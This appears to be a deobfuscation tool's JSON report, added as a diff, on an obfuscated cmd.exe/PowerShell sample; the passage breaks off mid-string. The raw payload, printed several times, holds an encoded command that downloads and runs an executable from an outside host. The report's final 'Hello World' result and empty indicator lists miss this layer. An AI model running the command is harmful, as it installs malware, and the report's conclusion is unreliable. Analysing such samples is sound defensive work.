@@ -1,0 +1,877 @@
+{
+  "sample": "S3_cmd_caret_ps_xor",
+  "payload": "\"C:\\Windows\\System32\\cmd.exe\" /c p^ow^ER^s^HE^LL -e WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBzAHkAcwB0AGUAbQAuAEMATwBOAHYAZQBSAHQAXQA6ADoAZgBSAE8ATQBCAGEAcwBlADYANABzAFQAcgBpAE4ARwAoACIAZABBAEIAeQBBAEgAawBBAGUAdwBCAG0AQQBHADgAQQBjAGcAQQBnAEEAQwBnAEEASgBBAEIAcABBAEQAMABBAE0AUQBBADcAQQBDAEEAQQBKAEEAQgBwAEEAQwBBAEEATABRAEIAcwBBAEcAVQBBAEkAQQBBAHgAQQBEAE0AQQBNAEEAQQB3AEEARABBAEEATwB3AEEAZwBBAEMAUQBBAGEAUQBBAHIAQQBDAHMAQQBLAFEAQQBnAEEASABzAEEASgBBAEIAcABBAEMAdwBBAEkAZwBCAGcAQQBHADQAQQBJAGcAQgA5AEEASAAwAEEAWQB3AEIAaABBAEgAUQBBAFkAdwBCAG8AQQBIAHMAQQBmAFEAQQBnAEEARwBZAEEAZABRAEIAdQBBAEcATQBBAGQAQQBCAHAAQQBHADgAQQBiAGcAQQBnAEEARwBzAEEAYwBRAEIAdABBAEcAVQBBAGEAQQBBAGcAQQBDAGcAQQBJAEEAQQBrAEEASABrAEEAYwBBAEIAbwBBAEcAbwBBAFkAdwBBAGcAQQBDAHcAQQBJAEEAQQBrAEEASABFAEEAYQBBAEIAcwBBAEMAQQBBAEsAUQBBAGcAQQBIAHMAQQBhAFEAQgBOAEEASABBAEEAYgB3AEIAUwBBAEgAUQBBAEwAUQBCAE4AQQBFADgAQQBaAEEAQgBWAEEARQB3AEEAUgBRAEEAZwBBAEcASQBBAGEAUQBCAFUAQQBGAE0AQQBWAEEAQgB5AEEARQBFAEEAVABnAEIAegBBAEUAWQBBAFIAUQBCAHkAQQBEAHMAQQBEAFEAQQBLAEEARgBNAEEAZABBAEIAQgBBAEYASQBBAFYAQQBBAHQAQQBFAEkAQQBhAFEAQgBVAEEASABNAEEAVgBBAEIAUwBBAEcARQBBAGIAZwBCAFQAQQBHAFkAQQBSAFEAQgB5AEEAQwBBAEEATABRAEIAegBBAEcAOABBAGQAUQBCAHkAQQBFAE0AQQBaAFEAQQBnAEEAQwBRAEEAZQBRAEIAdwBBAEcAZwBBAGEAZwBCAGoAQQBDAEEAQQBMAFEAQgBFAEEARwBVAEEAYwB3AEIAVQBBAEcAawBBAGIAZwBCAEIAQQBIAFEAQQBTAFEAQgB2AEEARQA0AEEASQBBAEEAawBBAEgARQBBAGEAQQBCAHMAQQBEAHMAQQBJAEEAQgBKAEEARwA0AEEAZABnAEIAdgBBAEcAcwBBAFoAUQBBAHQAQQBFAGsAQQBkAEEAQgBsAEEARwAwAEEASQBBAEEAawBBAEgARQBBAGEAQQBCAHMAQQBEAHMAQQBmAFEAQQBOAEEAQQBvAEEAZABBAEIAeQBBAEgAawBBAGUAdwBBAGcAQQBDAEEAQQBKAEEAQgBqAEEASABjAEEAZAB3AEIAbwBBAEcAVQBBAFkAZwBBADkAQQBDAFEAQQBaAFEAQgB1AEEASABZAEEATwBnAEIAMABBAEcAVQBBAGIAUQBCAHcAQQBDAHMAQQBKAHcAQgBjAEEASABNAEEAWQB3AEIAMwBBAEgAZwBBAFkAdwBBAHUAQQBHAFUAQQBlAEEAQgBsAEEAQwBjAEEATwB3AEEATgBBAEEAbwBBAGEAdwBCAHgAQQBHADAAQQBaAFEAQgBvAEEAQwBBAEEASgB3AEIAbwBBAEgAUQBBAGQAQQBCAHcAQQBEAG8AQQBMAHcAQQB2AEEARwBjAEEAWgBRAEIAdgBBAEgASQBBAFoAdwBCAGwAQQBIAEEAQQBjAGcAQgBoAEEASABBAEEAWQBRAEIAegBBAEMANABBAFkAdwBCAHYAQQBHADAAQQBMAHcAQgBqAEEARwBVAEEAYgBRAEEAdgBBAEYAWQBBAFYAZwBCAGEAQQBFADAAQQBXAFEAQgBNAEEARQBnAEEAWQBRAEIAVABBAEUAOABBAFkAdwBCAGkAQQBHAHcAQQBjAFEAQgB2AEEAQwA0AEEAWgBRAEIANABBAEcAVQBBAEoAdwBBAGcAQQBDAFEAQQBZAHcAQgAzAEEASABjAEEAYQBBAEIAbABBAEcASQBBAE8AdwBBAE4AQQBBAG8AQQBJAEEAQgA5AEEARwBNAEEAWQBRAEIAMABBAEcATQBBAGEAQQBCADcAQQBIADAAQQAiACkAKQB8AEkAZQBYAA== powershell  -NoProfil -NonInter     \"((97,68 ,95 ,66,83 , 27 , 126, 89 , 69 , 66 ,22 ,17 , 126,83,90 , 90 ,89,22 , 97,89, 68 ,90 ,82 , 23 , 17 ,22 , 27 , 112, 89 ,68, 83 , 81,68 , 89,67 ,88 , 82 ,117, 89 , 90,89, 68 , 22 ,113,68 , 83,8 3 ,88,13 , 22,97,68 , 95,66 , 83,27 ,126,89 , 69 , 66 , 22 , 17 , 121,84, 80, 67 ,69,85,87, 66,95, 89, 88 , 22, 100 ,89, 85, 93 , 69, 23, 17 ,22,27 , 112,89 ,68 ,83 ,81 , 68 , 89, 67, 88 ,82,117, 89,90 , 89, 68,22 ,113,68, 83 , 83,88 ) | fOREACh-objEct{[ChAR]($_ -bxoR'0x36' )} )-jOIn'' | InVOKE-ExpressIon\"",
+  "smart": {
+    "recipe": [
+      {
+        "op": "ascii-decimal-decode",
+        "args": {},
+        "reason": "Applied ascii-decimal-decode"
+      },
+      {
+        "op": "xor",
+        "args": {},
+        "reason": "Single-byte XOR key recovered from wrapper"
+      }
+    ],
+    "output": "Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green\n\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      archetype:PS_ASCII_XOR_IEX \u00b7 conf 100/100\n  Chain:       ascii-decimal-decode \u2192 xor\n\n  MITRE ATT&CK\n    T1059.001    \u00b7 Execution\n    T1027.010    \u00b7 Defense Evasion\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       cmd.exe\n\n  Behavior\n    1. Executes downloaded content in-memory with IEX (no disk\n        write)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501",
+    "notes": [
+      "Matched named wrapper archetype: PowerShell (int,int,...) | ForEach [char]($_ -bxor <k>) -join '' | IEX \u2014 recovers the original PowerShell script"
+    ],
+    "detected_type": null,
+    "engine": "archetype:PS_ASCII_XOR_IEX",
+    "reached_shellcode": false,
+    "confidence": 100,
+    "trace": [
+      {
+        "op": "ascii-decimal-decode",
+        "args": {},
+        "reason": "Applied ascii-decimal-decode",
+        "output_preview": " \u0000\u0004\u0006\u0000\u0000\u0006\b\u0004\u0000\u0000\u0000\u0003\u0003\u0005\u0003\b\u0003\u0004\u0003\u0000\u0005\u0005\u0000\u0003\u0002\u0000\u0000\u0003\u0001\u0003\u0003\u0003\b\u0002\u0002\u0000\b\u0004\b\u0005\baD_BS\u001b~YEB\u0016\u0011~SZZY\u0016aYDZR\u0017\u0011\u0016\u001bpYDSQDYCXRuYZYD\u0016qDS\b\u0003X\r\u0016aD_BS\u001b~YEB\u0016\u0011yTPCEUWB_YX\u0016dYU]E\u0017\u0011\u0016\u001bpYDSQDYCXRuYZYD\u0016qDSSX\u0000$",
+        "output_length": 149,
+        "evidence": {
+          "encoding": "ascii-decimal-decode",
+          "op": "ascii-decimal-decode",
+          "length": 149,
+          "ascii": false,
+          "entropy": 4.79,
+          "hex_preview": "20 00 04 06 00 00 06 08 04 00 00 00 03 03 05 03 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      },
+      {
+        "op": "xor",
+        "args": {},
+        "reason": "Single-byte XOR key recovered from wrapper",
+        "output_preview": "\n*.,**,\".***))/)\").)*//*)(**)+)))\"((*\".\"/\"Knuhy1Tsoh<;Typps<Ksnpx=;<1Zsny{nsirx_spsn<[ny\")r'<Knuhy1Tsoh<;S~zio\u007f}husr<Ns\u007fwo=;<1Zsny{nsirx_spsn<[nyyr*\u000e",
+        "output_length": 149,
+        "evidence": {
+          "encoding": "Single-byte XOR",
+          "op": "xor",
+          "length": 149,
+          "ascii": true,
+          "entropy": 4.79,
+          "hex_preview": "0a 2a 2e 2c 2a 2a 2c 22 2e 2a 2a 2a 29 29 2f 29 \u2026",
+          "integrity": {
+            "ok": true,
+            "reason": null
+          }
+        }
+      }
+    ],
+    "chain_ids": [
+      "ascii-decimal-decode",
+      "xor"
+    ],
+    "score": 100,
+    "custom_recipes_matched": [],
+    "boost": {
+      "enabled": true,
+      "signal_kind": "ps-generic",
+      "chain": [
+        "ps-join-char-array"
+      ],
+      "source": "history",
+      "confidence": 1.0,
+      "alternatives": [
+        {
+          "chain": [
+            "extract-b64",
+            "utf16le-or-utf8-decode"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "env-expand"
+          ],
+          "score": 38,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "base64-decode",
+            "gzip-decompress",
+            "download-shell-bg"
+          ],
+          "score": 30,
+          "source": "history"
+        },
+        {
+          "chain": [
+            "extract-payload",
+            "base64-decode",
+            "xor",
+            "gzip-decompress"
+          ],
+          "score": 30,
+          "source": "history"
+        }
+      ],
+      "signals": {
+        "length": 2980,
+        "length_bucket": "l",
+        "entropy": 4.497,
+        "b64_density": 0.909,
+        "has_powershell": true,
+        "has_encoded_cmd": false,
+        "has_iwr": false,
+        "has_downloadstr": false,
+        "has_gzip_prefix": false,
+        "has_zlib_prefix": false,
+        "has_utf16le_hint": false,
+        "has_curl_pipe": false,
+        "has_wget_pipe": false,
+        "has_bash_prefix": false,
+        "has_mshta": false,
+        "has_certutil": false,
+        "has_rundll32": false,
+        "has_regsvr32": false,
+        "has_hex_stream": false,
+        "has_unicode_esc": false,
+        "has_url_encoded": false,
+        "has_html_entities": false,
+        "has_defanged": false,
+        "has_reg_persist": false,
+        "has_charcode": false
+      }
+    },
+    "boost_hit": false,
+    "corrupted_container": null,
+    "reasoning": {
+      "mode": "balanced",
+      "input_profile": {
+        "kind": "script_wrapper",
+        "entropy": 4.497,
+        "length": 2980,
+        "letter_ratio": 0.819,
+        "digit_ratio": 0.089,
+        "punct_ratio": 0.049,
+        "space_ratio": 0.043,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.848,
+        "priors": [
+          "extract-payload",
+          "powershell-encoded",
+          "powershell-deobfuscate"
+        ],
+        "reasons": [
+          "script-marker"
+        ]
+      },
+      "output_profile": {
+        "kind": "text_like",
+        "entropy": 4.364,
+        "length": 104,
+        "letter_ratio": 0.808,
+        "digit_ratio": 0.0,
+        "punct_ratio": 0.106,
+        "space_ratio": 0.087,
+        "non_printable_ratio": 0.0,
+        "upper_ratio": 0.167,
+        "priors": [
+          "rot-n-brute",
+          "atbash",
+          "reverse",
+          "xor-single-byte"
+        ],
+        "reasons": [
+          "text-shape"
+        ]
+      },
+      "input_linguistic_score": 0.9033,
+      "output_linguistic_score": 0.9194,
+      "linguistic_delta": 0.0161,
+      "confidence": {
+        "confidence": 0.7491,
+        "band": "medium",
+        "structural": 0.7,
+        "readability": 0.9637,
+        "entropy_sanity": 0.95,
+        "context": 0.3,
+        "weights": {
+          "structural": 0.3,
+          "readability": 0.3,
+          "entropy_sanity": 0.2,
+          "context": 0.2
+        },
+        "reasons": [
+          "structural: inferred-valid (printable=1.00)",
+          "readability: printable=1.00, linguistic=0.92",
+          "entropy: natural-text-entropy=4.36",
+          "context: wrapper-implied-payload-but-no-command-tokens"
+        ],
+        "dimensions": {
+          "structural": {
+            "score": 0.7,
+            "reason": "inferred-valid (printable=1.00)"
+          },
+          "readability": {
+            "score": 0.9637,
+            "reason": "printable=1.00, linguistic=0.92"
+          },
+          "entropy_sanity": {
+            "score": 0.95,
+            "reason": "natural-text-entropy=4.36"
+          },
+          "context": {
+            "score": 0.3,
+            "reason": "wrapper-implied-payload-but-no-command-tokens"
+          }
+        }
+      },
+      "explanation": "Chain [ascii-decimal-decode \u2192 xor] did not linguistically improve readability (\u0394=+0.016 linguistic score). Selected by evidence-based scoring: structural validity, printable ratio, English density, and analyst-keyword hits.",
+      "narrative": null,
+      "trace": null
+    },
+    "layer_trace": [
+      {
+        "layer": "L0",
+        "engine": "archetype",
+        "chain_len": 2,
+        "score": 1.0,
+        "verdict": "matched"
+      },
+      {
+        "layer": "L1",
+        "engine": "smart",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      },
+      {
+        "layer": "L2",
+        "engine": "magic",
+        "chain_len": 0,
+        "score": 0.0,
+        "verdict": "skipped"
+      }
+    ],
+    "l3_metadata": null,
+    "layer_iocs": [],
+    "analysis_mode": "balanced",
+    "verdict_card": {
+      "label": "Suspicious",
+      "confidence": 60,
+      "reason": "Peeled 2 encoding layer(s) without an executable signature \u2014 reviewer confirmation required.",
+      "indicators": [
+        {
+          "label": "Low entropy (4.36) \u2014 data is likely readable / ASCII text",
+          "kind": "neutral"
+        },
+        {
+          "label": "Single-byte XOR layer peeled",
+          "kind": "neutral"
+        }
+      ],
+      "recommended_action": "Escalate to IR for behavioural sandbox / dynamic analysis and confirm the terminal payload against threat-intel."
+    },
+    "mode": "strict",
+    "risk": {
+      "verdict": "Suspicious",
+      "level": "suspicious",
+      "score": 60
+    },
+    "iocs": {
+      "urls": [],
+      "ips": [],
+      "domains": [],
+      "emails": [],
+      "md5": [],
+      "sha1": [],
+      "sha256": [],
+      "bitcoin_addresses": []
+    },
+    "mitre": [
+      {
+        "id": "T1059.001",
+        "technique": "PowerShell (hidden)",
+        "tactic": "Execution"
+      },
+      {
+        "id": "T1027.010",
+        "technique": "PowerShell -EncodedCommand fragment \u2014 long base64 payload",
+        "tactic": "Defense Evasion"
+      },
+      {
+        "id": "T1027",
+        "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+        "tactic": "Defense Evasion"
+      }
+    ],
+    "lolbas": [
+      {
+        "binary": "cmd.exe",
+        "purposes": [
+          "Execute"
+        ],
+        "mitre": [
+          "T1059.003"
+        ],
+        "description": "cmd.exe with /c chain or caret-obfuscation",
+        "snippet": "C:\\Windows\\System32\\cmd.exe\" /c p^ow^ER^s^HE^LL -e WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBz",
+        "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+        "source": "curated"
+      }
+    ],
+    "ti_shield": [
+      {
+        "layer": 0,
+        "label": "L0 \u00b7 RAW INPUT",
+        "op": "raw",
+        "preview": "\"C:\\Windows\\System32\\cmd.exe\" /c p^ow^ER^s^HE^LL -e WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBzAHkAcwB0AGUAbQAuAEMATwBOAHYAZQBSAHQAXQA6ADoAZgBSAE8ATQBCAGEAcwBlADYANABzAFQAcgBpAE4ARwAoACIAZABBAEIAeQBBAEgAawBBAGUAdwBCAG0AQQBHADgAQQBjAGcAQQBnAEEAQwBnAEEASgBBAEIAcABBAEQAMABBAE0AUQBBADcAQQBDAEEAQQBKAEEAQgBwAEEAQwBBAEEATABRAEIAcwBB",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [
+          {
+            "binary": "cmd.exe",
+            "purposes": [
+              "Execute"
+            ],
+            "mitre": [
+              "T1059.003"
+            ],
+            "description": "cmd.exe with /c chain or caret-obfuscation",
+            "snippet": "C:\\Windows\\System32\\cmd.exe\" /c p^ow^ER^s^HE^LL -e WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBz",
+            "url": "https://lolbas-project.github.io/lolbas/Binaries/cmd/",
+            "source": "curated"
+          }
+        ],
+        "mitre": [
+          {
+            "id": "T1059.001",
+            "technique": "PowerShell (hidden)",
+            "tactic": "Execution"
+          },
+          {
+            "id": "T1027.010",
+            "technique": "PowerShell -EncodedCommand fragment \u2014 long base64 payload",
+            "tactic": "Defense Evasion"
+          },
+          {
+            "id": "T1027",
+            "technique": "Standalone long base64 blob (>=200 chars) \u2014 likely encoded payload",
+            "tactic": "Defense Evasion"
+          }
+        ],
+        "yara": [
+          {
+            "rule": "IEX_Invocation",
+            "severity": "high",
+            "match": "InVOKE-ExpressIon",
+            "description": "In-memory execution via IEX"
+          },
+          {
+            "rule": "CMD_Obfuscation_Caret",
+            "severity": "medium",
+            "match": "^o",
+            "description": "CMD.exe caret-based obfuscation"
+          },
+          {
+            "rule": "Base64_Long_Blob",
+            "severity": "low",
+            "match": "WwBzAFkAUwB0AGUAbQAuAFQAZQBYAFQALgBFAE4AYwBvAEQASQBOAGcAXQA6ADoAdQBuAEkAQwBvAEQARQAuAGcAZQB0AHMAdAByAEkAbgBHACgAWwBzAHkA",
+            "description": "Long Base64 blob"
+          },
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "Windows",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 36,
+          "band": "medium"
+        }
+      },
+      {
+        "layer": "final",
+        "label": "L-FINAL \u00b7 DECODED PAYLOAD",
+        "op": "final",
+        "preview": "Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green",
+        "iocs": {
+          "urls": [],
+          "ips": [],
+          "domains": [],
+          "emails": [],
+          "md5": [],
+          "sha1": [],
+          "sha256": [],
+          "bitcoin_addresses": []
+        },
+        "lolbas": [],
+        "mitre": [],
+        "yara": [
+          {
+            "rule": "PS_CaseMixed_Obfuscation",
+            "severity": "low",
+            "match": "ForegroundColor",
+            "description": "Alternating-case keyword obfuscation to evade string-signature detection"
+          }
+        ],
+        "ti_hits": [],
+        "live_osint": {},
+        "family_hint": null,
+        "severity": {
+          "score": 4,
+          "band": "none"
+        }
+      }
+    ],
+    "output_raw": "Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green",
+    "report_text": "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\nNIVXRAY INVESTIGATION SUMMARY\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n  Engine:      archetype:PS_ASCII_XOR_IEX \u00b7 conf 100/100\n  Chain:       ascii-decimal-decode \u2192 xor\n\n  MITRE ATT&CK\n    T1059.001    \u00b7 Execution\n    T1027.010    \u00b7 Defense Evasion\n    T1027        \u00b7 Defense Evasion\n\n  LOLBIN       cmd.exe\n\n  Behavior\n    1. Executes downloaded content in-memory with IEX (no disk\n        write)\n\n  Per-layer decoded outputs available in the Chain / Trace panel \u2191\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
+  },
+  "magic": {
+    "initial_score": {
+      "score": 0.45,
+      "printable": 1.0,
+      "english": 0.0,
+      "entropy": 3.82,
+      "size": 2384,
+      "reasons": [
+        "printable=1.00"
+      ]
+    },
+    "candidates_explored": 6,
+    "isolation_note": "Isolated 2384-char base64 payload from script wrapper",
+    "top_results": [
+      {
+        "chain": [
+          {
+            "op": "extract-payload",
+            "args": {}
+          },
+          {
+            "op": "base64-decode",
+            "args": {}
+          },
+          {
+            "op": "utf16le-decode",
+            "args": {}
+          }
+        ],
+        "output": "[sYStem.TeXT.ENcoDINg]::unICoDE.getstrInG([system.CONveRt]::fROMBase64sTriNG(\"dAByAHkAewBmAG8AcgAgACgAJABpAD0AMQA7ACAAJABpACAALQBsAGUAIAAxADMAMAAwADAAOwAgACQAaQArACsAKQAgAHsAJABpACwAIgBgAG4AIgB9AH0AYwBhAHQAYwBoAHsAfQAgAGYAdQBuAGMAdABpAG8AbgAgAGsAcQBtAGUAaAAgACgAIAAkAHkAcABoAGoAYwAgACwAIAAkAHEAaABsACAAKQAgAHsAaQBNAHAAbwBSAHQALQBNAE8AZABVAEwARQAgAGIAaQBUAFMAVAByAEEATgBzAEYARQByADsADQAKAFMAdABBAFIAVAAtAEIAaQBUAHMAVABSAGEAbgBTAGYARQByACAALQBzAG8AdQByAEMAZQAgACQAeQBwAGgAagBjACAALQBEAGUAcwBUAGkAbgBBAHQASQBvAE4AIAAkAHEAaABsADsAIABJAG4AdgBvAGsAZQAtAEkAdABlAG0AIAAkAHEAaABsADsAfQANAAoAdAByAHkAewAgACAAJABjAHcAdwBoAGUAYgA9ACQAZQBuAHYAOgB0AGUAbQBwACsAJwBcAHMAYwB3AHgAYwAuAGUAeABlACcAOwANAAoAawBxAG0AZQBoACAAJwBoAHQAdABwADoALwAvAGcAZQBvAHIAZwBlAHAAcgBhAHAAYQBzAC4AYwBvAG0ALwBjAGUAbQAvAFYAVgBaAE0AWQBMAEgAYQBTAE8AYwBiAGwAcQBvAC4AZQB4AGUAJwAgACQAYwB3AHcAaABlAGIAOwANAAoAIAB9AGMAYQB0AGMAaAB7AH0A\"))|IeX",
+        "score_breakdown": {
+          "score": 1.0257,
+          "printable": 1.0,
+          "english": 0.086,
+          "entropy": 4.528,
+          "size": 893,
+          "reasons": [
+            "printable=1.00",
+            "english-density=0.09",
+            "json-shape",
+            "ps-keywords"
+          ]
+        },
+        "path_scores": [
+          0.45,
+          0.7,
+          1.0257
+        ],
+        "entropy": 4.528,
+        "is_shellcode": false
+      },
+      {
+        "chain": [
+          {
+            "op": "extract-payload",
+            "args": {}
+          },
+          {
+            "op": "base64-decode",
+            "args": {}
+          }
+        ],
+        "output": "[\u0000s\u0000Y\u0000S\u0000t\u0000e\u0000m\u0000.\u0000T\u0000e\u0000X\u0000T\u0000.\u0000E\u0000N\u0000c\u0000o\u0000D\u0000I\u0000N\u0000g\u0000]\u0000:\u0000:\u0000u\u0000n\u0000I\u0000C\u0000o\u0000D\u0000E\u0000.\u0000g\u0000e\u0000t\u0000s\u0000t\u0000r\u0000I\u0000n\u0000G\u0000(\u0000[\u0000s\u0000y\u0000s\u0000t\u0000e\u0000m\u0000.\u0000C\u0000O\u0000N\u0000v\u0000e\u0000R\u0000t\u0000]\u0000:\u0000:\u0000f\u0000R\u0000O\u0000M\u0000B\u0000a\u0000s\u0000e\u00006\u00004\u0000s\u0000T\u0000r\u0000i\u0000N\u0000G\u0000(\u0000\"\u0000d\u0000A\u0000B\u0000y\u0000A\u0000H\u0000k\u0000A\u0000e\u0000w\u0000B\u0000m\u0000A\u0000G\u00008\u0000A\u0000c\u0000g\u0000A\u0000g\u0000A\u0000C\u0000g\u0000A\u0000J\u0000A\u0000B\u0000p\u0000A\u0000D\u00000\u0000A\u0000M\u0000Q\u0000A\u00007\u0000A\u0000C\u0000A\u0000A\u0000J\u0000A\u0000B\u0000p\u0000A\u0000C\u0000A\u0000A\u0000L\u0000Q\u0000B\u0000s\u0000A\u0000G\u0000U\u0000A\u0000I\u0000A\u0000A\u0000x\u0000A\u0000D\u0000M\u0000A\u0000M\u0000A\u0000A\u0000w\u0000A\u0000D\u0000A\u0000A\u0000O\u0000w\u0000A\u0000g\u0000A\u0000C\u0000Q\u0000A\u0000a\u0000Q\u0000A\u0000r\u0000A\u0000C\u0000s\u0000A\u0000K\u0000Q\u0000A\u0000g\u0000A\u0000H\u0000s\u0000A\u0000J\u0000A\u0000B\u0000p\u0000A\u0000C\u0000w\u0000A\u0000I\u0000g\u0000B\u0000g\u0000A\u0000G\u00004\u0000A\u0000I\u0000g\u0000B\u00009\u0000A\u0000H\u00000\u0000A\u0000Y\u0000w\u0000B\u0000h\u0000A\u0000H\u0000Q\u0000A\u0000Y\u0000w\u0000B\u0000o\u0000A\u0000H\u0000s\u0000A\u0000f\u0000Q\u0000A\u0000g\u0000A\u0000G\u0000Y\u0000A\u0000d\u0000Q\u0000B\u0000u\u0000A\u0000G\u0000M\u0000A\u0000d\u0000A\u0000B\u0000p\u0000A\u0000G\u00008\u0000A\u0000b\u0000g\u0000A\u0000g\u0000A\u0000G\u0000s\u0000A\u0000c\u0000Q\u0000B\u0000t\u0000A\u0000G\u0000U\u0000A\u0000a\u0000A\u0000A\u0000g\u0000A\u0000C\u0000g\u0000A\u0000I\u0000A\u0000A\u0000k\u0000A\u0000H\u0000k\u0000A\u0000c\u0000A\u0000B\u0000o\u0000A\u0000G\u0000o\u0000A\u0000Y\u0000w\u0000A\u0000g\u0000A\u0000C\u0000w\u0000A\u0000I\u0000A\u0000A\u0000k\u0000A\u0000H\u0000E\u0000A\u0000a\u0000A\u0000B\u0000s\u0000A\u0000C\u0000A\u0000A\u0000K\u0000Q\u0000A\u0000g\u0000A\u0000H\u0000s\u0000A\u0000a\u0000Q\u0000B\u0000N\u0000A\u0000H\u0000A\u0000A\u0000b\u0000w\u0000B\u0000S\u0000A\u0000H\u0000Q\u0000A\u0000L\u0000Q\u0000B\u0000N\u0000A\u0000E\u00008\u0000A\u0000Z\u0000A\u0000B\u0000V\u0000A\u0000E\u0000w\u0000A\u0000R\u0000Q\u0000A\u0000g\u0000A\u0000G\u0000I\u0000A\u0000a\u0000Q\u0000B\u0000U\u0000A\u0000F\u0000M\u0000A\u0000V\u0000A\u0000B\u0000y\u0000A\u0000E\u0000E\u0000A\u0000T\u0000g\u0000B\u0000z\u0000A\u0000E\u0000Y\u0000A\u0000R\u0000Q\u0000B\u0000y\u0000A\u0000D\u0000s\u0000A\u0000D\u0000Q\u0000A\u0000K\u0000A\u0000F\u0000M\u0000A\u0000d\u0000A\u0000B\u0000B\u0000A\u0000F\u0000I\u0000A\u0000V\u0000A\u0000A\u0000t\u0000A\u0000E\u0000I\u0000A\u0000a\u0000Q\u0000B\u0000U\u0000A\u0000H\u0000M\u0000A\u0000V\u0000A\u0000B\u0000S\u0000A\u0000G\u0000E\u0000A\u0000b\u0000g\u0000B\u0000T\u0000A\u0000G\u0000Y\u0000A\u0000R\u0000Q\u0000B\u0000y\u0000A\u0000C\u0000A\u0000A\u0000L\u0000Q\u0000B\u0000z\u0000A\u0000G\u00008\u0000A\u0000d\u0000Q\u0000B\u0000y\u0000A\u0000E\u0000M\u0000A\u0000Z\u0000Q\u0000A\u0000g\u0000A\u0000C\u00